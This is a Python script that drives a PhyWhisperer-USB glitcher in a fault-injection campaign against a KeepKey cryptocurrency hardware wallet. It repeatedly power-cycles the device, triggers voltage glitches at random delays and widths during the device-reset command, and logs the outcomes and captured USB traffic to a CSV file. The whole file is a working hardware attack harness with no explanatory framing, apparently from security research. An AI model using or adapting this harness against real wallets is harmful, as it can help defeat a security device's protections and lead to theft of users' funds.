#!/usr/bin/env python3

import phywhisperer.usb as pw
import csv
import base64
import random
import pickle
import signal
import uuid
import time

f_csv = open("pewpew-%s.csv" % uuid.uuid4(),"w")
spamwriter = csv.writer(f_csv,delimiter=',',quotechar='\"')

import sys

print("Configuring PhyWhispererUSB")
phy = pw.Usb()
# phy.set_usb_mode("LS")
phy.con(program_fpga = True)
phy.reset_fpga()
phy.addpattern = True
phy.set_power_source("off")
pattern_true = [0x20,0x00,0x2a,0x07,0x65,0x6e,0x67,0x6c,0x69,0x73,0x68,0x32]

import time

from keepkeylib.client import KeepKeyClient, KeepKeyClientVerbose, KeepKeyDebuglinkClient, KeepKeyDebuglinkClientVerbose
import keepkeylib.client
import keepkeylib.types_pb2 as types
from keepkeylib.transport_hid import HidTransport

def sighandler(signum,frame):
  print("Exception handler hit!")
  raise Exception("Exception handler hit!")

signal.signal(signal.SIGALRM,sighandler)

# 58166 (interrupt in?)

for i in range(1,1000):
  delay = random.randint(1200,20000)
  try_repeat = random.randint(35,75)
  # try_repeat = 30
  phy.set_trigger(num_triggers=1,delays=[delay],widths=[try_repeat])
  phy.set_pattern(pattern_true,mask=[0xff for c in pattern_true])
  print("Preparing for attempt %d, glitch at %f, %d width" % (i,delay,try_repeat))
  phy.set_power_source("off")
  time.sleep(0.5)
  phy.set_power_source("host")
  time.sleep(3.0)
  enumerateStatus = False
  enumerateCount = 0
  while enumerateStatus is False:
    try:
      print("Attempting enumeration...")
      path = HidTransport.enumerate()[0][0]
      print("Path OK!")
      enumerateStatus = True
    except:
      print("Enumerate failed, continuing next pass")
      time.sleep(0.5)
      if enumerateCount == 3:
        break
      enumerateCount += 1
      continue
  if enumerateStatus is False:
    print("Enumerate hard failed, power cycling")
    continue
  print("Fetching path...")
  for d in HidTransport.enumerate():
    if path in d:
      transport = HidTransport(d)
      break
  print("Transport locked, continuing...")
  phy.set_capture_size(256)
  client = KeepKeyClient(transport)
  print("KeepKeyClient OK, arming glitcher...")
  phy.arm()
  print("Arm OK")
  try:
    signal.alarm(10)
    client.reset_device(True,256,False,False,"",'english',safety=False)
    data = "No exception"
    signal.alarm(0)
  except keepkeylib.client.CallException as e:
    [code,error] = e.args
    data = "KKError: %s" % error
  except Exception as e:
    print(e)
    data = "NonCallException:%s" % e
  # signal.alarm(0)
  print(data)
  print("Waiting for disarm...")
  phy.wait_disarmed()
  raw = phy.read_capture_data()
  packets = phy.split_packets(raw)
  spamwriter.writerow([delay,try_repeat,data,base64.b64encode(pickle.dumps(raw))])
  printPackets = pw.USBSimplePrintSink(highspeed=phy.get_usb_mode() == 'HS')
  for packet in packets:
    if len(packet["contents"]) == 3 and packet["contents"][0] == 165:
      continue
    else:
      print(packet["timestamp"])
      printPackets.handle_usb_packet(ts=packet['timestamp'],buf=bytearray(packet['contents']),flags=0)

f_csv.close()
print("Done!")
sys.exit(0)

